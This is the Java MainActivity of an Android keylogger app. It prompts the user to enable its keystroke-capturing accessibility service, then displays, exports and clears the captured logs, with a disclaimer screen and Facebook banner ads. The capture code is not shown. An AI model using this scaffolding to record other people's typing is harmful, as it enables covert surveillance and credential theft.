package com.gpow.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.preference.PreferenceManager;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.facebook.ads.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import static com.gpow.androidkeylogger.FileOperations.writeTextToFile;

public class MainActivity extends AppCompatActivity {

    private View popupAccessibilityView;
    private View changeAccessibilityView;
    private Button logsButton;
    private Button exportButton;
    private Button clearButton;

    private AdView mAdView;
//    private AdRequest mAdRequest;
    private int REFRESH_RATE_IN_SECONDS = 5;
    private final Handler refreshHandler = new Handler();
//    private final Runnable refreshRunnable = new RefreshRunnable();

    private SwipeRefreshLayout swipeRefreshLayout;

    private Toast toast = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getSupportActionBar().hide();
        updateText();
        setupDisclaimer();
        setupView();

        checkForAccessibility();

        setUpAdView();

    }

    @Override
    protected void onRestart() {
//        mAdView.resume();
        super.onRestart();
        checkForAccessibility();
        updateText();
    }

    @Override
    public void onPause() {
        // Pause the AdView.
//        mAdView.pause();
        super.onPause();
    }

    @Override
    public void onDestroy() {
        // Destroy the AdView.
        mAdView.destroy();
        super.onDestroy();
    }


    /* Setup AdView */
    private void setUpAdView() {

        // Instantiate an AdView object.
        // NOTE: The placement ID from the Facebook Monetization Manager identifies your App.
        // To get test ads, add IMG_16_9_APP_INSTALL# to your placement id. Remove this when your app is ready to serve real ads.
        mAdView = new AdView(this, "IMG_16_9_APP_INSTALL#592578959156779_592661299148545", AdSize.BANNER_HEIGHT_50);

        // Find the Ad Container
        LinearLayout adContainer = (LinearLayout) findViewById(R.id.banner_container);

        // Add the ad view to your activity layout
        adContainer.addView(mAdView);

        AdListener adListener = new AdListener() {
            @Override
            public void onError(Ad ad, AdError adError) {
                // Ad error callback
                Toast.makeText(
                                MainActivity.this,
                                "Error: " + adError.getErrorMessage(),
                                Toast.LENGTH_LONG)
                        .show();
            }

            @Override
            public void onAdLoaded(Ad ad) {
                // Ad loaded callback
            }

            @Override
            public void onAdClicked(Ad ad) {
                // Ad clicked callback
            }

            @Override
            public void onLoggingImpression(Ad ad) {
                // Ad impression logged callback
            }
        };

//        AdSettings.addTestDevice("c41dde11-89f0-4e71-8c5c-b77dc7f38bc3");
        // Request an ad with listener
        mAdView.loadAd(mAdView.buildLoadAdConfig().withAdListener(adListener).build());
    }

    private void checkForAccessibility() {

        if (!isAccessibilityServiceEnabled(this, KeyLoggerAccessibilityService.class)) {
            popupAccessibilityView.setVisibility(View.VISIBLE);
        }
        else {
            popupAccessibilityView.setVisibility(View.GONE);
        }
    }


    static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName()))
                return true;
        }

        return false;
    }


    private void setupDisclaimer() {
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
        String agreement = preferences.getString("KeyLogger.TermsAgreed", "false");
        if (agreement.equals("false")) {
            // Unhide disclaimer window
            View disclaimerWindow = (View) findViewById(R.id.disclaimerWindow);
            disclaimerWindow.setVisibility(View.VISIBLE);

            // Configure DisclaimerAgreeBtn
            Button disclaimerAgreeButton = (Button) findViewById(R.id.disclaimerAgreeBtn);
            disclaimerAgreeButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    // Hide disclaimer window
                    View disclaimerWindow = (View) findViewById(R.id.disclaimerWindow);
                    disclaimerWindow.setVisibility(View.GONE);

                    // Saved terms agreed
                    SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(MainActivity.this);
                    SharedPreferences.Editor editor = preferences.edit();
                    editor.putString("KeyLogger.TermsAgreed", "true");
                    editor.apply();
                }
            });
        }
    }


    private void setupView() {

        swipeRefreshLayout = findViewById(R.id.swipeRefreshLayout);
        swipeRefreshLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                updateText();
                showToast("Content refreshed!");
                swipeRefreshLayout.setRefreshing(false);
            }
        });

        // Setup ignore accessibility view
        popupAccessibilityView = findViewById(R.id.accessibility_popup);
        popupAccessibilityView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                findViewById(R.id.accessibility_popup).setVisibility(View.GONE);
            }
        });

        changeAccessibilityView = findViewById(R.id.accessibility_modify);
        changeAccessibilityView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
            }
        });

//        // Setup Refresh Button
//          TODO: Either create a list view for all the log files or find a way to redirect to file manager
//        logsButton = (Button)findViewById(R.id.logsButton);
////        setOnTouchEffect(refreshButton);
//        logsButton.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                openLogPath();
//            }
//        });

        // Setup Export Button
        exportButton = (Button)findViewById(R.id.exportButton);
//        setOnTouchEffect(exportButton);
        exportButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                exportText();
                // shareFile(filepath);
            }
        });

        // Setup Clear Button
        clearButton = (Button)findViewById(R.id.clearButton);
//        setOnTouchEffect(clearButton);
        clearButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                exportText();
                clearText();
            }
        });
    }


    private void exportText() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss z");
        String currentDatetime = sdf.format(new Date());
        String filepath = getExternalFilesDir("/").getAbsolutePath() + "/keylogger_text_" + currentDatetime + ".txt";
        writeTextToFile(filepath, loadContents());
        showToast("File exported to " + filepath);
    }


    private void clearText() {
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(MainActivity.this);
        SharedPreferences.Editor editor = preferences.edit();
        editor.putString("KeyLogger", "");
        editor.apply();
        updateText();
//        showToast("Text cleared!");
    }


    private void showToast(String msg) {
        if (toast != null) {
            toast.cancel();
        }
        toast = Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG);
        toast.show();
    }
//    private void setOnTouchEffect(Button button) {
//
//        button.setOnTouchListener(new View.OnTouchListener() {
//            @Override
//            public boolean onTouch(View v, MotionEvent event) {
//
//                Button btn = (Button)v;
//
//                if (event.getActionMasked() == MotionEvent.ACTION_BUTTON_PRESS) {
//                    btn.setTextColor(getResources().getColor(R.color.colorButtonBackground));
//                    btn.setBackgroundColor(getResources().getColor(R.color.colorButtonText));
//                }
//                else if (event.getActionMasked() == MotionEvent.ACTION_BUTTON_RELEASE) {
//                    btn.setTextColor(getResources().getColor(R.color.colorButtonText));
//                    btn.setBackgroundColor(getResources().getColor(R.color.colorButtonBackground));
//                }
//                return false;
//            }
//        });
//    }

    private void updateText() {
        TextView textView = findViewById(R.id.logs);
        textView.setText("Logs: " + loadContents());
    }


    public static Context getContext() {
        return getContext();
    }

    private String loadContents() {
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
        String logs = preferences.getString("KeyLogger", "No logs found");
        return logs;
    }

    /*
        Intent operations
    */

//
//    public void openLogPath() {
//
//        try {
//            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
//            String path1 = getExternalFilesDir("/").getAbsolutePath() + "/Android/data/com.gpow.androidkeylogger/files/";
//            String path = getPackageManager().getPackageInfo(getPackageName(), 0).applicationInfo.dataDir;
//            String path2 = getApplicationInfo().dataDir;
//            Uri uri = Uri.parse(path);
//            intent.setDataAndType(uri, "*/*");
//            startActivity(intent);
//        }
//        catch (Exception e) {
//            Log.e("keyL", "Error occured when opening log path");
//        }
//    }
//
//    public void openLogPath()
//    {
//        // location = "/sdcard/my_folder";
//        Intent intent = new Intent(Intent.ACTION_VIEW);
//        Uri mydir = Uri.parse(getExternalFilesDir("/").getAbsolutePath());
//        intent.setDataAndType(mydir,"application/*");    // or use */*
//        startActivity(intent);
//    }

//    private void newOpener() {
//        Intent chooser = new Intent(Intent.ACTION_GET_CONTENT);
//        Uri uri = Uri.parse(Environment.getDownloadCacheDirectory().getPath().toString());
//        chooser.addCategory(Intent.CATEGORY_OPENABLE);
//        chooser.setDataAndType(uri, "*/*");
//// startActivity(chooser);
//        try {
//            startActivityForResult(chooser, SELECT_FILE);
//        }
//        catch (android.content.ActivityNotFoundException ex)
//        {
//            Toast.makeText(this, "Please install a File Manager.",
//                    Toast.LENGTH_SHORT).show();
//        }
//    }

//    private void openLogPath() {
//        String path = getExternalFilesDir("/").getAbsolutePath();
//        Uri selectedUri = Uri.parse(getExternalFilesDir("/").getAbsolutePath());
//        Intent intent = new Intent(Intent.ACTION_VIEW);
//        intent.setDataAndType(selectedUri, "resource/folder");
//
//        if (intent.resolveActivityInfo(getPackageManager(), 0) != null)
//        {
//            startActivity(intent);
//        }
//        else
//        {
//            showToast("Could not find explorer app installed on the device");
//        }
//    }


    private void shareFile(String filepath) {
        Intent intentShareFile = new Intent(Intent.ACTION_SEND);
        File fileWithinMyDir = new File(filepath);

        if(fileWithinMyDir.exists()) {
            intentShareFile.setType("application/pdf");
            intentShareFile.putExtra(Intent.EXTRA_STREAM, Uri.parse("file://"+filepath));

            intentShareFile.putExtra(Intent.EXTRA_SUBJECT,
                    "Sharing File...");
            intentShareFile.putExtra(Intent.EXTRA_TEXT, "Sharing File...");

            startActivity(Intent.createChooser(intentShareFile, "Share File"));
        }
    }

//    private class RefreshRunnable implements Runnable {
//        @Override
//        public void run() {
//            mAdView.loadAd();
//        }
//    }
}
